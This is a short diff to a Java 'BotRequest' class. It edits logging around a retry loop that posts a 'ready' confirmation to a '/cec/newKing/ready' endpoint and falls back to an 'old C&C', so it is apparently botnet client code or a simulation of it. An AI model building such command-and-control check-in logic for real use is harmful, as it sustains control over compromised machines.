@@ -367,11 +367,10 @@ public class BotRequest {
 			try {
 				String url = HTTPS + ip + PORT + "/cec/newKing/ready";
 				response =restTemplate.postForObject(url, null, boolean.class);
-				System.out.println("ready cec ");
 				return response;
 			} catch (Exception e) {
 				// e.printStackTrace();
-				System.out.println("Errore richiesta conferma to old cec");
+				System.out.println("Errore richiesta conferma al vecchio C&C");
 				try {
 					count++;
 					Thread.sleep(WAIT_RANGE);
